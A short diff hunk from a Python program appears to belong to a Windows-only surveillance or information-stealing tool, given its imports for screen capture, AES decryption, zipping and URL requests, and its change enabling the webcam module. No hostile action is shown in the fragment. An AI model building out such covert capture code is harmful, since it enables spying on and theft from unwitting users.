@@ -37,7 +37,7 @@ from urllib.request import Request, urlopen
 from zipfile import ZipFile
 from Crypto.Cipher import AES
 from PIL import ImageGrab
-pygame.init()
+pygame.camera.init()
 
 if platform.system() != "Windows":
     sys.exit()
